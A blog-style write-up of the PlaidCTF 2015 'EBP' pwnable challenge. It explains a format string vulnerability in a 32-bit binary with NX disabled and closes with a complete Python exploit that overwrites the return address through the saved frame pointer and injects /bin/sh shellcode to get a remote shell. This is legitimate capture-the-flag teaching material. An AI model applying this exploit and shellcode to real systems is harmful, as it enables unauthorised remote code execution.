---
layout: post
title: "PlaidCTF CTF 2015 - EBP Writeup"
date: 2015-04-20 22:40:13 +0430
comments: true
categories: ctf plaidctf fmt pwnable
---

**PlaidCTF 2015 EBP Writeup**  
**Point = 160**  
**Category = Pwnable**  

Unfortunately the CTF time for our team was completely under heavy pressure. but here is one i solved in my free time.

> Category: Pwnable Points: 160 Solves: 157 Description:
>    nc 52.6.64.173 4545
>    Download: %p%o%o%p.


We are given an ELF file:

```
$ file ebp_a96f7231ab81e1b0d7fe24d660def25a.elf 
ebp_a96f7231ab81e1b0d7fe24d660def25a.elf: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=4e8094f9986968cd856db5093810badbb0749fde, not stripped
```

first attempt peresented us that it's a Format String Vulenrability.

```
$ ./ebp_a96f7231ab81e1b0d7fe24d660def25a.elf 
%p%p%p%p%p
0xa0x10xf76c40000xffec67180x804852c
```

We noticed that the binary is provided with disabled NX.
<!-- more -->
```
checksec.sh --file ebp_a96f7231ab81e1b0d7fe24d660def25a.elf 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ebp_a96f7231ab81e1b0d7fe24d660def25a.elf
```
So it was pretty simple to run our shellcode and execute proper command to read the flag.

It was the time to see the binary. IDA showed us that the buggy function is `make_response` since no FMT was used.

```
int make_response()
{
  return snprintf(response, 0x400u, buf);
}
```

but `response` and `buf` are on **BSS** and we should change execution flow to this address `0x0804A480`.

By dumping stack on executing `make_response` we had these values:

```
Breakpoint 1, 0x08048503 in make_response ()
gdb-peda$ x/64wx $esp
0xffffcc30:     0xf7fadc20      0x0804a080      0x000003ff      0x0000000a
0xffffcc40:     0x00000001      0xf7fad000      0xffffcc68      0x0804852c
0xffffcc50:     0xffffcc88      0xf7ff04b0      0xffffccb4      0xf7fad000
0xffffcc60:     0x00000000      0x00000000      0xffffcc88      0x08048557
0xffffcc70:     0x0804a080      0x00000400      0xf7fadc20      0xf7fad000
0xffffcc80:     0x08048580      0x00000000      0x00000000      0xf7e1da83
0xffffcc90:     0x00000001      0xffffcd24      0xffffcd2c      0xf7feac9a
0xffffcca0:     0x00000001      0xffffcd24      0xffffccc4      0x0804a01c
0xffffccb0:     0x08048278      0xf7fad000      0x00000000      0x00000000
0xffffccc0:     0x00000000      0xb9b964cc      0x8594c0dc      0x00000000
0xffffccd0:     0x00000000      0x00000000      0x00000001      0x08048400
0xffffcce0:     0x00000000      0xf7ff04b0      0xf7e1d999      0xf7ffd000
0xffffccf0:     0x00000001      0x08048400      0x00000000      0x08048421
0xffffcd00:     0x08048547      0x00000001      0xffffcd24      0x08048580
0xffffcd10:     0x080485f0      0xf7feb130      0xffffcd1c      0x0000001c
0xffffcd20:     0x00000001      0xffffcf57      0x00000000      0xffffcf96
```

You may notice that to overwriting a value via FMT vuln we should provide an address to `%n`. but we had just BSS variables so we should make this environment manually. As name of the challenge suggets we can use saved frame pointer since it has address of this frame. The scenario is pretty simple:

1. leak an stack address to find location of RET address of current function `make_response`.
2. overwrite RET address in place of saved frame pointer (which ebp points to it).
3. again using a format string overwrite RET with `response` address. 

You should notice that we should write 2 least significant byte of ebp address location (%hhn).

TL;DR 

This is what i used as exploiting this challenge:

```
import socket
import struct
import telnetlib

response = 0x0804a480

offset = 4 # saved frame pointer offset 

shellcode = (  # /bin/sh shellcode at http://shell-storm.org/shellcode/files/shellcode-236.php
	"\x6a\x0b\x58\x99\x52\x68\x2f\x2f"
        "\x73\x68\x68\x2f\x62\x69\x6e\x54"
        "\x5b\x52\x53\x54\x59\x0f\x34"
)

s = socket.create_connection(("52.6.64.173", 4545 ))
#s = socket.create_connection(("127.0.0.1", 8080 ))
s.send("%4$p\n")
addr = int(s.recv(1024), 16)
print "[+] Leaked Address: ", hex(addr)
addr1 = (addr - 0x1c) & 0xffff
print "[+] 2Byte Significant Byte to write : ", hex(addr1) 

s.send("%"+str(addr1)+"x%"+str(offset)+"$hn\n")
s.recv(4096)

s.send(shellcode+"%"+str((response & 0xffff)-len(shellcode))+"x%"+str(12)+"$hn\n")
print "[+] Here you go"
t = telnetlib.Telnet()
t.sock = s
t.interact()
```

running the exploit we have: 

```
$ python 5.py 
[+] Leaked Address:  0xffbea7c8
[+] 2Byte Significant Byte to write :  0xa7ac
[+] Here you go
cat /home/problem/flag.txt
who_needs_stack_control_anyway?
```

So we've got 160 point.

@HAMIDx9
